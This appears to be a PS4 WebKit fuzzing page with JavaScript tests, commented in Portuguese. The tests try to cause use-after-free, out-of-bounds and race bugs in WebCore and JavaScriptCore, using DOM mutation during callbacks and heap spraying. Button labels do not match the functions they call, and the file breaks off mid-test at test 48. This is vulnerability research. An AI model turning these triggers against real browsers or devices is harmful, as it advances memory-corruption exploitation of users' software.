<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit Fuzzing - Testes Manuais (Lote 6)</title>
</head>
<body>
    <h1>Testes de Corrupcao WebCore - Execucao Manual</h1>
    
    <div style="margin-bottom: 20px;">
        <button onclick="test16()">Test 16: Dialog Modal Race</button>
        <button onclick="test17()">Test 17: Details Toggle UAF</button>
        <button onclick="test18()">Test 18: Select Index OOB</button>
        <button onclick="test19()">Test 19: Print Layout Race</button>
        <button onclick="test20()">Test 20: NodeIterator Pointer</button>
        <button onclick="test21()">Test 21: Dialog Modal Race</button>
        <button onclick="test22()">Test 22: Details Toggle UAF</button>
        <button onclick="test23()">Test 23: Select Index OOB</button>
        <button onclick="test24()">Test 24: Print Layout Race</button>
        <button onclick="test25()">Test 25: NodeIterator Pointer</button>
        <button onclick="test26()">Test 26: Dialog Modal Race</button>
        <button onclick="test27()">Test 27: Details Toggle UAF</button>
        <button onclick="test28()">Test 28: Select Index OOB</button>
        <button onclick="test29()">Test 29: Print Layout Race</button>
        <button onclick="test30()">Test 30: NodeIterator Pointer</button>
        <button onclick="test31()">Test 31: Array Splice Getter Mutation</button>
        <button onclick="test32()">Test 32: Proxy Prototype Type Confusion</button>
        <button onclick="test33()">Test 33: Array Sort OOB</button>
        <button onclick="test34()">Test 34: RegExp Interpreter Stack/Heap</button>
        <button onclick="test35()">Test 35: Worker Transferable Race</button>
        <button onclick="test36()">Test 36: MessagePort Entanglement</button>
        <button onclick="test37()">Test 37: DOMParser Document UAF</button>
        <button onclick="test38()">Test 38: DataTransfer Item OOB</button>
        <button onclick="test39()">Test 39: CustomEvent Detail Mutation</button>
        <button onclick="test40()">Test 40: History State Serialization</button>
        <button onclick="test41()">Test 41: Iframe postMessage Race</button>
        <button onclick="test42()">Test 42: FileReader Blob UAF</button>
        <button onclick="test43()">Test 43: CharacterData Mutation</button>
        <button onclick="test44()">Test 44: URLSearchParams Iterator</button>
        <button onclick="test45()">Test 45: Form Reset Lifecycle</button>
        <button onclick="test46()">Test 46: Text Normalize UAF</button>
        <button onclick="test47()">Test 47: Focus Controller Race</button>
        <button onclick="test48()">Test 48: Range Surround OOB</button>
        <button onclick="test49()">Test 49: Track Event UAF</button>
        <button onclick="test50()">Test 50: Template AdoptNode Race</button>
        <button onclick="test51()">Test 51: execCommand Mutation UAF</button>
        <button onclick="test52()">Test 52: Canvas State Machine OOB</button>
        <button onclick="test53()">Test 53: FontFaceSet Promise Race</button>
        <button onclick="test54()">Test 54: Range Extract Reentrancy</button>
        <button onclick="test55()">Test 55: Shadow DOM Slot Assignment</button>
        <button onclick="test56()">Test 56: XPath Iterator UAF</button>
        <button onclick="test57()">Test 57: Options Collection OOB</button>
        <button onclick="test58()">Test 58: TextDecoder Detached Buffer</button>
        <button onclick="test59()">Test 59: DOMMatrix Getter Mutation</button>
        <button onclick="test60()">Test 60: Media Promise Reentrancy</button>
        <button onclick="test61()">Test 61: XSLTProcessor Transformation UAF</button>
        <button onclick="test62()">Test 62: ResizeObserver Layout Race</button>
        <button onclick="test63()">Test 63: Bidi Text Layout OOB</button>
        <button onclick="test64()">Test 64: WebSocket Buffer Race</button>
        <button onclick="test65()">Test 65: Fragment TreeWalker Entanglement</button>
        <button onclick="test66()">Test 66: Object Fallback UAF</button>
        <button onclick="test67()">Test 67: Focus/Blur Sync Race</button>
        <button onclick="test68()">Test 68: SplitText Range OOB</button>
        <button onclick="test69()">Test 69: Image Decode Promise</button>
        <button onclick="test70()">Test 70: Event Path Amputation</button>
        <button onclick="test71()">Test 71: CSS Rule Iterator Invalidation</button>
        <button onclick="test72()">Test 72: Recursive Event Dispatch</button>
        <button onclick="test73()">Test 73: Isolated Document GC Race</button>
        <button onclick="test74()">Test 74: Sync Style Recalculation UAF</button>
        <button onclick="test75()">Test 75: XMLSerializer Mutating Race</button>
        <button onclick="test76()">Test 76: SVG Use Shadow Tree UAF</button>
        <button onclick="test77()">Test 77: Custom Element Upgrade Race</button>
        <button onclick="test78()">Test 78: PostMessage Transfer Getter</button>
        <button onclick="test79()">Test 79: Table InsertRow Mutation</button>
        <button onclick="test80()">Test 80: CSS Variable Cascade UAF</button>
        <button onclick="test81()">Test 81: Pseudo-element Render UAF</button>
        <button onclick="test82()">Test 82: Input Type Mutation OOB</button>
        <button onclick="test83()">Test 83: Picture Source Engine Race</button>
        <button onclick="test84()">Test 84: Marquee Legacy Timer UAF</button>
        <button onclick="test85()">Test 85: CSS Transition Event Race</button>
        <button onclick="test86()">Test 86: CSS Font Feature Iterator Race</button>
        <button onclick="test87()">Test 87: HTML Parser Reentrancy UAF</button>
        <button onclick="test88()">Test 88: JSC Butterfly Reallocation OOB</button>
        <button onclick="test89()">Test 89: SVG Animation Timer UAF</button>
        <button onclick="test90()">Test 90: Event Listener Dangling Pointer</button>
        <button onclick="test91()">Test 91: MediaSource Buffer UAF</button>
        <button onclick="test92()">Test 92: DocumentType Replacement OOB</button>
        <button onclick="test93()">Test 93: Details Cascade UAF</button>
        <button onclick="test94()">Test 94: VTTCueList Active Race</button>
        <button onclick="test95()">Test 95: Cross-Document Selection Amputation</button>
        <button onclick="test96()">Test 96: Heap Grooming + UAF (Completo)</button>
        <button onclick="test97()">Test 97: MutationRecord Queue UAF</button>
        <button onclick="test98()">Test 98: IndexedDB Transaction Race</button>
        <button onclick="test99()">Test 99: Range Boundary Comparison OOB</button>
        <button onclick="test100()">Test 100: Proxy Concat Type Confusion (Butterfly)</button>
    </div>

    <hr>
    <div id="log-container"></div>

    <script>
        function logMsg(msg) {
            console.log(msg);
            let p = document.createElement("p");
            p.innerText = msg;
            document.getElementById("log-container").appendChild(p);
        }
// Teste 16: Adoção Cruzada de Nós (Cross-Document AdoptNode UAF)
        // Cria um documento virtual em memória, extrai um nó dele e destrói o documento origem.
        // O WebCore pode falhar ao atualizar os ponteiros de contexto (Document pointer) do nó órfão.
        function test16() {
            logMsg("Iniciando Teste 16 (Cross-Document AdoptNode)...");
            try {
                let doc = document.implementation.createHTMLDocument("fuzz_doc");
                let orphanNode = doc.createElement("div");
                doc.body.appendChild(orphanNode);
                
                // Quebra a referência do documento original para forçar a coleta
                doc = null; 
                
                // Força um spray rápido para ocupar a memória do documento destruído
                let spray = new Array(1000).fill(new ArrayBuffer(128));
                
                // Tenta adotar o nó cujo documento pai "não existe" mais
                document.body.appendChild(document.adoptNode(orphanNode));
            } catch(e) {}
            logMsg("Fim do Teste 16.");
        }

        // Teste 17: Corrupção de Fragmento via HTMLTemplateElement
        // A tag <template> armazena nós em um DocumentFragment isolado no C++.
        // Esvaziar o template enquanto manipulamos um filho direto pode vazar a referência.
        function test17() {
            logMsg("Iniciando Teste 17 (Template Fragment UAF)...");
            try {
                let tpl = document.createElement("template");
                let frag = tpl.content; // Aponta para o DocumentFragment interno
                let span = document.createElement("span");
                frag.appendChild(span);
                
                // Oblítera o conteúdo do template via parser HTML interno
                tpl.innerHTML = "";
                
                // Tenta interagir com o filho que estava atrelado ao fragmento destruído
                span.appendChild(document.createElement("b"));
            } catch(e) {}
            logMsg("Fim do Teste 17.");
        }

        // Teste 18: Quebra de Iterador em Validação Síncrona de Formulário
        // O WebCore usa um iterador nativo para varrer os elementos do form durante o checkValidity().
        // Remover um elemento vizinho durante esse loop síncrono causa desvio de ponteiro.
        function test18() {
            logMsg("Iniciando Teste 18 (Form Validation Iterator Race)...");
            try {
                let form = document.createElement("form");
                let input1 = document.createElement("input");
                let input2 = document.createElement("input");
                input1.required = true;
                input2.required = true;
                
                form.appendChild(input1);
                form.appendChild(input2);
                document.body.appendChild(form);

                // Quando o C++ estiver validando o input1, nós destruímos o input2 da memória
                input1.addEventListener("invalid", () => {
                    input2.remove();
                });
                
                // Dispara o loop em C++
                form.checkValidity();
            } catch(e) {}
            logMsg("Fim do Teste 18.");
        }

        // Teste 19: Vetor de Propagação de Eventos (Event Path UAF)
        // Quando um evento é disparado, o WebCore cria um array nativo (Event Path) com os nós.
        // Destruir o nó alvo de dentro do seu próprio manipulador corrompe esse vetor.
        function test19() {
            logMsg("Iniciando Teste 19 (Event Path Propagation UAF)...");
            try {
                let btn = document.createElement("button");
                document.body.appendChild(btn);
                
                btn.addEventListener("fuzzEvent", (e) => {
                    // Remove o nó da árvore DOM
                    btn.remove();
                    
                    // Tenta acessar o caminho do evento, que agora contém um ponteiro liberado
                    let path = e.composedPath(); 
                });
                
                // Despacha um evento customizado borbulhante
                btn.dispatchEvent(new Event("fuzzEvent", {composed: true, bubbles: true}));
            } catch(e) {}
            logMsg("Fim do Teste 19.");
        }

        // Teste 20: SVG foreignObject Tree Mutation
        // Elementos foreignObject permitem injetar HTML normal dentro do pipeline rigoroso do SVG.
        // Remover a raiz SVG enquanto se manipula o nó HTML interno causa anomalias de layout.
        function test20() {
            logMsg("Iniciando Teste 20 (SVG foreignObject Mutation)...");
            try {
                let svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
                let foreign = document.createElementNS("http://www.w3.org/2000/svg", "foreignObject");
                let div = document.createElement("div");
                
                foreign.appendChild(div);
                svg.appendChild(foreign);
                document.body.appendChild(svg);
                
                // Remove o contêiner SVG inteiro
                svg.remove();
                
                // Força o motor a recalcular o layout do nó HTML que estava no contexto SVG
                div.innerHTML = "<b>trigger layout</b>";
                let forceLayout = div.offsetHeight; 
            } catch(e) {}
            logMsg("Fim do Teste 20.");
        }
// Teste 21: TreeWalker e Deleção do Nó Atual
        // O TreeWalker mantém um ponteiro interno nativo (C++) para o nó atual.
        // Mudar a estrutura da árvore e remover o nó atual antes do próximo passo pode causar OOB ou UAF.
        function test21() {
            logMsg("Iniciando Teste 21 (TreeWalker UAF)...");
            try {
                let div = document.createElement("div");
                let span = document.createElement("span");
                div.appendChild(span);
                
                let walker = document.createTreeWalker(div, NodeFilter.SHOW_ELEMENT);
                walker.currentNode = span;
                
                // Removemos o nó atual da árvore em que o Walker está iterando
                span.remove();
                
                // Tenta forçar o motor do WebCore a calcular o próximo nó a partir do limbo
                walker.nextNode(); 
            } catch(e) {}
            logMsg("Fim do Teste 21.");
        }

        // Teste 22: TextTrack (Media) Lifecycle
        // Elementos de mídia têm subsistemas internos que não dependem de WebAudio.
        // A faixa de legenda (TextTrack) e suas Cues gerenciam memória assíncrona.
        function test22() {
            logMsg("Iniciando Teste 22 (TextTrack Cue UAF)...");
            try {
                let video = document.createElement("video");
                let track = video.addTextTrack("subtitles", "Fuzz", "en");
                
                // VTTCue está disponível no WebKit padrão e injeta blocos no backend
                let cue = new VTTCue(0, 1, "fuzz test");
                track.addCue(cue);
                
                // Desanexa o vídeo inteiro, limpando seus componentes na memória
                video = null;
                
                // O track ainda possui uma referência no JavaScript, tentamos manipular
                // um cue de um componente que deveria ter sido destruído.
                track.removeCue(cue);
            } catch(e) {}
            logMsg("Fim do Teste 22.");
        }

        // Teste 23: Reestruturação Síncrona de Tabelas HTML
        // As tabelas possuem métodos injetados diretamente em C++ (insertRow, deleteRow).
        // Acelerar a exclusão de seções enquanto se manipula as linhas gera desvios de ponteiro.
        function test23() {
            logMsg("Iniciando Teste 23 (Table Section OOB)...");
            try {
                let table = document.createElement("table");
                let tbody = table.createTBody();
                let row = tbody.insertRow(0);
                row.insertCell(0);
                
                // Destrói o corpo da tabela, mas a linha ainda tem referência do JS
                tbody.remove();
                
                // Força o WebCore a acessar a árvore da tabela agora corrompida
                table.insertRow(0);
                row.innerHTML = "<td>órfão</td>";
            } catch(e) {}
            logMsg("Fim do Teste 23.");
        }

        // Teste 24: Iframe Document Overwrite (Dangling Pointer)
        // Usar document.write() em um iframe limpa completamente sua árvore DOM subjacente.
        // Reter referências do nó antigo (como o body) e tentar escrever nelas causa colapso na memória.
        function test24() {
            logMsg("Iniciando Teste 24 (Iframe Document Overwrite)...");
            try {
                let frame = document.createElement("iframe");
                document.body.appendChild(frame);
                
                let doc = frame.contentDocument;
                let bodyRef = doc.body; // Guarda o ponteiro do corpo original
                
                // Overwrite destrói a árvore C++ subjacente vinculada ao documento
                doc.write("<h1>Nova Árvore</h1>");
                doc.close();
                
                // Spray rápido para sobrepor a memória que o corpo antigo ocupava
                let spray = [];
                for(let i=0; i<500; i++) spray.push(new ArrayBuffer(256));
                
                // Tenta injetar nós na referência órfã
                bodyRef.appendChild(document.createElement("div"));
            } catch(e) {}
            logMsg("Fim do Teste 24.");
        }

        // Teste 25: IntersectionObserver em Nó Desconectado
        // Observadores dependem de cálculos visuais e de layout profundos.
        // Forçar a extração síncrona de registros de um nó recém destruído e coletado pelo GC.
        function test25() {
            logMsg("Iniciando Teste 25 (IntersectionObserver GC)...");
            try {
                let target = document.createElement("div");
                document.body.appendChild(target);
                
                let observer = new IntersectionObserver(() => {});
                observer.observe(target);
                
                // Desconecta o elemento
                target.remove();
                target = null;
                
                // Spray massivo de strings para pressionar o Coletor de Lixo do interpretador LLInt
                let spray = new Array(15000).fill("A".repeat(1024));
                
                // Força o motor C++ a processar a lista de nós alvo que podem já ter sido liberados
                observer.takeRecords();
                observer.disconnect();
            } catch(e) {}
            logMsg("Fim do Teste 25.");
        }

        // Teste 26: Dialog Modal Race Condition
        // A API <dialog> manipula a "top-layer" do renderizador do navegador.
        // Chamar close() em um modal que acabou de ser removido da árvore do DOM
        // frequentemente causa o colapso do gerenciador de camadas C++.
        function test26() {
            logMsg("Iniciando Teste 26 (Dialog Modal)...");
            try {
                let dialog = document.createElement('dialog');
                document.body.appendChild(dialog);
                
                dialog.showModal(); // Eleva o elemento para a camada superior do renderizador
                dialog.remove();    // Remove o nó da árvore de layout principal
                
                // O WebCore tenta acessar a estrutura do modal destruído para atualizar o estado da tela
                dialog.close();     
            } catch(e) {}
            logMsg("Fim do Teste 26.");
        }

        // Teste 27: Details/Summary Toggle Event UAF
        // Mudar a propriedade 'open' dispara um evento síncrono ou assíncrono de re-renderização.
        // Destruir o elemento principal durante a captura desse evento deixa a árvore inconsistente.
        function test27() {
            logMsg("Iniciando Teste 27 (Details Toggle)...");
            try {
                let details = document.createElement('details');
                let summary = document.createElement('summary');
                details.appendChild(summary);
                document.body.appendChild(details);
                
                details.addEventListener('toggle', () => {
                    // Assim que o motor avisa que o estado mudou, nós apagamos o elemento
                    details.remove();
                });
                
                // Força a mudança de estado que aciona o C++ para expandir o layout
                details.open = true; 
            } catch(e) {}
            logMsg("Fim do Teste 27.");
        }

        // Teste 28: Select e Option Index OOB
        // O elemento <select> mantém um array interno nativo com os índices das <options>.
        // Manipular o selectedIndex após destruir a opção ativa pode levar a uma leitura fora dos limites (OOB).
        function test28() {
            logMsg("Iniciando Teste 28 (Select OOB)...");
            try {
                let select = document.createElement('select');
                let option = document.createElement('option');
                option.text = "Fuzz";
                select.appendChild(option);
                document.body.appendChild(select);
                
                select.selectedIndex = 0; // Fixa o ponteiro C++ na opção atual
                
                option.remove(); // Limpa a memória da opção
                
                // Tenta extrair o valor de uma opção que já foi deletada do vetor interno
                let leak = select.value; 
            } catch(e) {}
            logMsg("Fim do Teste 28.");
        }

        // Teste 29: Print Layout Race (beforeprint)
        // O evento beforeprint congela a árvore de renderização. O PS4 pode bloquear o print() real, 
        // mas a invocação do evento força o WebKit a reestruturar a página.
        function test29() {
            logMsg("Iniciando Teste 29 (Print Layout Race)...");
            try {
                let p = document.createElement('p');
                p.innerText = "Target Node";
                document.body.appendChild(p);
                
                window.addEventListener('beforeprint', () => {
                    // O motor está se preparando para congelar o DOM, e nós excluímos um nó vital
                    p.remove(); 
                });
                
                // Aciona a rotina do WebCore
                window.print(); 
            } catch(e) {}
            logMsg("Fim do Teste 29.");
        }

        // Teste 30: NodeIterator Pointer UAF
        // Semelhante ao TreeWalker, mas foca na iteração linear. O iterador C++ guarda 
        // a referência exata do nó. Destruir o nó e pedir o 'previousNode' desorienta o ponteiro.
        function test30() {
            logMsg("Iniciando Teste 30 (NodeIterator UAF)...");
            try {
                let div = document.createElement('div');
                let span1 = document.createElement('span');
                let span2 = document.createElement('span');
                div.appendChild(span1);
                div.appendChild(span2);
                
                let iter = document.createNodeIterator(div, NodeFilter.SHOW_ELEMENT);
                iter.nextNode(); // Vai para 'div'
                iter.nextNode(); // Vai para 'span1'
                iter.nextNode(); // Vai para 'span2'
                
                // Destrói o nó imediatamente anterior no DOM
                span1.remove();
                
                // O iterador tenta voltar usando ponteiros nativos C++ que agora apontam para memória liberada
                iter.previousNode(); 
            } catch(e) {}
            logMsg("Fim do Teste 30.");
        }
// Teste 31: Array Splice com Mutação no Getter
        // O método nativo splice() no C++ faz suposições sobre o tamanho do array.
        // Se um getter disparar durante a cópia e encolher o array, o C++ pode continuar 
        // lendo/escrevendo além dos novos limites da memória (OOB no Butterfly).
        function test31() {
            logMsg("Iniciando Teste 31 (Array Splice OOB)...");
            try {
                let arr = [1.1, 2.2, 3.3, 4.4, 5.5];
                
                // Redefinimos o comportamento de leitura do índice 1
                Object.defineProperty(arr, 1, {
                    get: function() {
                        // Encolhemos o array drasticamente durante a operação nativa
                        arr.length = 1; 
                        
                        // Força a alocação de lixo para bagunçar a memória adjacente liberada
                        new ArrayBuffer(1024); 
                        return 2.2;
                    }
                });
                
                // O splice no C++ tentará mover os elementos baseados no length original
                arr.splice(0, 3);
            } catch(e) {}
            logMsg("Fim do Teste 31.");
        }

        // Teste 32: Proxy Trap Type Confusion
        // O LLInt rastreia as "Estruturas" (Shapes) dos objetos para acesso rápido.
        // Usar Proxies para interceptar a redefinição de protótipos enquanto mudamos o formato 
        // original do objeto pode causar desincronização entre o que o interpretador espera e o que está na memória.
        function test32() {
            logMsg("Iniciando Teste 32 (Proxy Type Confusion)...");
            try {
                let target = { a: 1 };
                let p = new Proxy(target, {
                    setPrototypeOf(target, newProto) {
                        // Muda radicalmente a estrutura interna do objeto adicionando muitas propriedades
                        for(let i=0; i<100; i++) target['prop'+i] = i;
                        return Reflect.setPrototypeOf(target, newProto);
                    }
                });
                
                // Aciona o manipulador nativo C++ para alteração de StructureID
                Object.setPrototypeOf(p, {});
            } catch(e) {}
            logMsg("Fim do Teste 32.");
        }

        // Teste 33: Array Sort OOB (Out-of-Bounds)
        // A função sort() tem uma implementação complexa no backend.
        // Alterar o tamanho da matriz sendo ordenada por dentro da função comparadora 
        // frequentemente resulta no C++ retendo um ponteiro inválido para a estrutura da Borboleta.
        function test33() {
            logMsg("Iniciando Teste 33 (Array Sort OOB)...");
            try {
                let arr = new Array(100).fill(1);
                
                arr.sort(function(a, b) {
                    // Quando o sort compara os primeiros itens, destruímos a matriz
                    if (arr.length > 0) {
                        arr.length = 0;
                        
                        // Ocupamos a memória recém-liberada com objetos falsos (FakeObjects) estruturais
                        let spray = new Array(500).fill({ fake: 0x41414141 });
                    }
                    return a - b;
                });
            } catch(e) {}
            logMsg("Fim do Teste 33.");
        }

        // Teste 34: RegExp Interpreter Stack/Heap
        // Com o JIT desativado, o motor de Regex (YARR) roda em modo puramente interpretado.
        // Expressões com backtracking massivo alinhadas a substituições com funções de callback
        // podem estressar o alocador do JSC e causar invasão de limites de memória.
        function test34() {
            logMsg("Iniciando Teste 34 (RegExp Interpreter Stress)...");
            try {
                // Regex vulnerável a backtracking catastrófico
                let re = /(a+)+b/;
                let str = "a".repeat(2000) + "c";
                
                str.replace(re, function(match) {
                    // Callback nativo; se a engine falhar em limpar o frame da pilha, 
                    // podemos vazar ponteiros ou corromper a execução.
                    return "b"; 
                });
            } catch(e) {}
            logMsg("Fim do Teste 34.");
        }

        // Teste 35: Web Worker Transferable Race Condition
        // Arrays transferíveis (ArrayBuffers) mudam sua propriedade exclusiva (ownership) no C++.
        // Se transferirmos um ArrayBuffer para um Worker e tentarmos lê-lo/gravá-lo na exata
        // microtask de postMessage, o JSC pode sofrer um Use-After-Free no espaço principal.
        function test35() {
            logMsg("Iniciando Teste 35 (Worker Transfer Race)...");
            try {
                // Cria um worker estático usando Blob para evitar dependência externa
                let blob = new Blob(["onmessage = function(e) { postMessage('done'); }"], {type: 'application/javascript'});
                let worker = new Worker(URL.createObjectURL(blob));
                
                let buffer = new ArrayBuffer(1024 * 1024); // 1MB
                let view = new Uint32Array(buffer);
                view[0] = 0x1337;
                
                // Transfere o buffer para o worker. O buffer no thread principal deve ficar indisponível.
                worker.postMessage(buffer, [buffer]);
                
                // Tentativa imediata de leitura/escrita antes que o gerenciador do JSC bloqueie o ponteiro nativamente.
                let leak = view[0]; 
                view[1] = 0x41414141; 
                
                worker.terminate();
            } catch(e) {}
            logMsg("Fim do Teste 35.");
        }
// Teste 36: MessagePort Entanglement e Coleta de Lixo
        // Portas de mensagem mantêm uma relação de "emaranhamento" (entanglement) no C++.
        // Enviar mensagens e imediatamente destruir as referências locais força o WebKit
        // a lidar com a entrega assíncrona para um ponteiro que está sendo coletado.
        function test36() {
            logMsg("Iniciando Teste 36 (MessagePort Entanglement)...");
            try {
                let channel = new MessageChannel();
                
                channel.port1.onmessage = () => {};
                
                // Dispara uma mensagem com um payload considerável
                channel.port2.postMessage(new Array(1000).fill("A"));
                
                // Quebra o emaranhamento e limpa as referências no exato momento da transferência
                channel.port1.close();
                channel.port2.close();
                channel = null;
                
                // Spray para pressionar o alocador
                let spray = new Array(5000).fill(new ArrayBuffer(128));
            } catch(e) {}
            logMsg("Fim do Teste 36.");
        }

        // Teste 37: DOMParser Document UAF
        // O DOMParser cria um Documento XML/HTML inteiramente em memória (C++).
        // Extrair um nó desse documento e imediatamente destruir a referência do documento pai
        // testa a robustez do gerenciamento de ciclo de vida de nós órfãos.
        function test37() {
            logMsg("Iniciando Teste 37 (DOMParser UAF)...");
            try {
                let parser = new DOMParser();
                let docString = "<div><span id='target'>Fuzz</span></div>";
                let tempDoc = parser.parseFromString(docString, "text/html");
                
                let targetNode = tempDoc.getElementById("target");
                
                // Remove a referência para o documento gerado pelo parser
                tempDoc = null;
                
                // Força alocação para reocupar a memória do documento destruído
                let forceGC = new Array(2000).fill(new String("LixoMemoria"));
                
                // Tenta interagir com o nó que pertencia ao documento agora inexistente
                targetNode.innerHTML = "<b>Trigger</b>";
                document.body.appendChild(targetNode);
            } catch(e) {}
            logMsg("Fim do Teste 37.");
        }

        // Teste 38: DataTransfer Item OOB (Simulação de Evento)
        // A API DataTransfer (usada em Drag & Drop e Clipboard) possui objetos de suporte complexos no C++.
        // Limpar os dados da transferência enquanto se mantém um ponteiro para um item individual
        // pode causar leitura fora dos limites (OOB).
        function test38() {
            logMsg("Iniciando Teste 38 (DataTransfer OOB)...");
            try {
                let dt = new DataTransfer();
                dt.items.add("Dados de Fuzzing", "text/plain");
                
                let itemRef = dt.items[0]; // Captura o ponteiro do item subjacente
                
                // Limpa o DataTransfer, instruindo o C++ a desalocar a lista interna
                dt.clearData();
                dt.items.clear();
                
                // Tenta acessar propriedades do item que deveria ter sido liberado
                let leak = itemRef.kind;
            } catch(e) {}
            logMsg("Fim do Teste 38.");
        }

        // Teste 39: CustomEvent Detail Mutation
        
        // Ao despachar um CustomEvent, a propriedade 'detail' é serializada/acessada pelo motor.
        // Mutar a estrutura dessa propriedade dentro de um listener capturando o próprio evento
        // pode desestabilizar o leitor de propriedades nativo do WebKit.
        function test39() {
            logMsg("Iniciando Teste 39 (CustomEvent Mutation)...");
            try {
                let div = document.createElement("div");
                document.body.appendChild(div);
                
                let detailObj = { a: 1, b: 2 };
                
                div.addEventListener("fuzz", function(e) {
                    // Durante o processamento síncrono, alteramos a estrutura fundamental do objeto
                    delete e.detail.a;
                    e.detail.c = new ArrayBuffer(1024);
                });
                
                let event = new CustomEvent("fuzz", { detail: detailObj });
                div.dispatchEvent(event);
            } catch(e) {}
            logMsg("Fim do Teste 39.");
        }

        // Teste 40: History State Serialization Race
        // O método pushState envia objetos do JS para serem estruturados e armazenados no backend do histórico em C++.
        // Enviar um objeto grande e substituí-lo rapidamente estressa a thread assíncrona de armazenamento de estado.
        function test40() {
            logMsg("Iniciando Teste 40 (History State Race)...");
            try {
                // Cria um objeto complexo e pesado para atrasar a serialização
                let heavyState = { data: new Array(10000).fill(0x1337) };
                
                window.history.pushState(heavyState, "Fuzz1", "?fuzz1");
                
                // Imediatamente substitui o estado antes que a serialização do anterior possa ter terminado com segurança
                window.history.replaceState({ data: 1 }, "Fuzz2", "?fuzz2");
                
                // Lê o estado atual para forçar a desserialização reversa no interpretador LLInt
                let currentState = window.history.state;
            } catch(e) {}
            logMsg("Fim do Teste 40.");
        }
// Teste 41: Iframe postMessage Race Condition
        // Envia uma mensagem via algoritmo de clonagem estruturada para um iframe
        // e destrói o contexto de execução (o iframe) enquanto a mensagem está na fila do event loop.
        function test41() {
            logMsg("Iniciando Teste 41 (Iframe postMessage Race)...");
            try {
                let frame = document.createElement("iframe");
                document.body.appendChild(frame);
                
                let win = frame.contentWindow;
                
                // Dispara a mensagem assíncrona
                win.postMessage({ fuzz: "payload_massivo".repeat(1000) }, "*");
                
                // Destrói imediatamente a árvore C++ do iframe
                frame.remove();
            } catch(e) {}
            logMsg("Fim do Teste 41.");
        }

        // Teste 42: FileReader e Blob Garbage Collection (UAF)
        // Inicia a leitura assíncrona de um Blob em memória pelo backend C++.
        // Remove as referências do JS e força o coletor de lixo, testando se a thread
        // de leitura do WebKit mantém um ponteiro seguro para a memória do Blob.
        function test42() {
            logMsg("Iniciando Teste 42 (FileReader Blob GC)...");
            try {
                let blob = new Blob(["Fuzzing".repeat(1024 * 10)], { type: "text/plain" });
                let reader = new FileReader();
                
                reader.onload = function() {
                    // Callback vazio, apenas para garantir que a engine tente concluir a leitura
                };
                
                reader.readAsText(blob);
                
                // Remove a referência principal do Blob
                blob = null;
                
                // Spray no Heap para forçar a sobreposição da memória caso o GC libere o Blob prematuramente
                let spray = [];
                for(let i=0; i<5000; i++) spray.push(new String("SprayMemory").repeat(100));
            } catch(e) {}
            logMsg("Fim do Teste 42.");
        }

        // Teste 43: CharacterData Mutation UAF
        // Observa as mudanças de texto puro (CharacterData) em um nó.
        // Altera o texto (disparando o observer) e, de dentro do callback, destrói o próprio nó de texto.
        function test43() {
            logMsg("Iniciando Teste 43 (CharacterData Mutation)...");
            try {
                let textNode = document.createTextNode("Fuzz Original");
                document.body.appendChild(textNode);
                
                let obs = new MutationObserver(() => {
                    // Remove o nó enquanto o WebCore ainda está processando os registros de mutação
                    textNode.remove();
                });
                
                obs.observe(textNode, { characterData: true });
                
                // Gatilho
                textNode.data = "Fuzz Modificado";
            } catch(e) {}
            logMsg("Fim do Teste 43.");
        }

        // Teste 44: Invalidação de Iterador no URLSearchParams (OOB)
        // Similar à lógica de quebra de mapas nativos C++, instanciamos um iterador
        // e apagamos as chaves por baixo dele enquanto iteramos.
        function test44() {
            logMsg("Iniciando Teste 44 (URLSearchParams Iterator)...");
            try {
                let params = new URLSearchParams("param1=1&param2=2&param3=3");
                let iter = params.entries();
                
                // Avança o ponteiro C++ do iterador
                iter.next();
                
                // Deleta uma chave, alterando o layout do mapa nativo no WebCore
                params.delete("param2");
                
                // Força o iterador a continuar a leitura, arriscando ler fora dos limites (Out-of-Bounds)
                let leak = iter.next();
            } catch(e) {}
            logMsg("Fim do Teste 44.");
        }

        // Teste 45: Form Reset Lifecycle Race
        // O método form.reset() itera nativamente sobre todos os controles do formulário.
        // Capturamos o evento síncrono de reset e removemos os inputs da árvore DOM
        // para confundir o loop do motor no backend.
        function test45() {
            logMsg("Iniciando Teste 45 (Form Reset Race)...");
            try {
                let form = document.createElement("form");
                let input1 = document.createElement("input");
                let input2 = document.createElement("input");
                
                input1.value = "A";
                input2.value = "B";
                
                form.appendChild(input1);
                form.appendChild(input2);
                document.body.appendChild(form);
                
                form.addEventListener("reset", () => {
                    // Quando o form avisa que começou o reset, nós apagamos os inputs
                    input1.remove();
                    input2.remove();
                });
                
                // Aciona a rotina interna do WebCore
                form.reset();
            } catch(e) {}
            logMsg("Fim do Teste 45.");
        }
 function test46() {
            logMsg("Iniciando Teste 46 (Text Normalize UAF)...");
            try {
                let div = document.createElement("div");
                let text1 = document.createTextNode("Fuzz");
                let text2 = document.createTextNode("ing");
                div.appendChild(text1);
                div.appendChild(text2);
                document.body.appendChild(div);
                
                let selection = window.getSelection();
                let range = document.createRange();
                
                // Seleciona do primeiro ao segundo nó de texto
                range.setStart(text1, 0);
                range.setEnd(text2, 3);
                selection.addRange(range);
                
                // O WebCore destrói text2 e mescla tudo em text1 nativamente
                div.normalize();
                
                // Tenta forçar o motor a ler a seleção que pode estar apontando para a memória do text2 (agora liberada)
                let leak = selection.getRangeAt(0).endContainer;
            } catch(e) {}
            logMsg("Fim do Teste 46.");
        }

        // Teste 47: Focus Controller Síncrono
        // O gerenciador de foco no WebCore é suscetível a reentradas.
        // Disparar um foco, interceptá-lo sincronicamente, destruir o nó e focar em outro
        // pode corromper a pilha de foco interno (FocusController).
        function test47() {
            logMsg("Iniciando Teste 47 (Focus Controller Race)...");
            try {
                let input1 = document.createElement("input");
                let input2 = document.createElement("input");
                document.body.appendChild(input1);
                document.body.appendChild(input2);
                
                input1.addEventListener("focus", function() {
                    // No meio da transição de foco no C++, removemos o nó alvo original
                    input1.remove();
                    // E forçamos o C++ a calcular um novo caminho de foco imediatamente
                    input2.focus();
                });
                
                // Gatilho
                input1.focus();
            } catch(e) {}
            logMsg("Fim do Teste 47.");
        }

        // Teste 48: Range.surroundContents() Out-of-Bounds
        // surroundContents move nós nativamente. Interceptar essa movimentação ou
        // apagar os nós logo após a extração pode deixar o objeto Range em um estado inválido.
        function test48() {
            logMsg("Iniciando Teste 48 (Range Surround OOB)...");
            try {
                let parent = document.createElement("div");
                let child = document.createElement("span");
                child.innerText = "Target";
                parent.appendChild(child);
                document.body.appendChild(parent);
                
                let wrapper = document.createElement("b");
                let range = document.createRange();
                range.selectNode(child);
                
                // Executa a operação complexa de C++
